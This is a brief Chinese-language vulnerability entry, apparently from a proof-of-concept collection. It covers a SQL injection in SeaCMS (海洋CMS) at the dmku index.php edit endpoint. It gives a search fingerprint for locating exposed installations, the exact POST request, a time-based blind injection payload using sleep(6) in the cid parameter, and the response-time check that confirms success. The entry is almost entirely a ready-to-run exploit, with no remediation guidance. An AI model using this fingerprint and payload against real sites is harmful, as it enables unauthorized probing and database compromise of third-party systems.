# SeaCMS海洋影视管理系统index.php存在SQL注入漏洞

SeaCMS ｜ SQL注入 ｜ —
- **指纹**：`app="海洋CMS"`
- **请求**：`POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1`

**Payload**
```
cid=(select(1)from(select(sleep(6)))x)&text=1&color=1
```
- **响应特征**：200 响应时间>=5s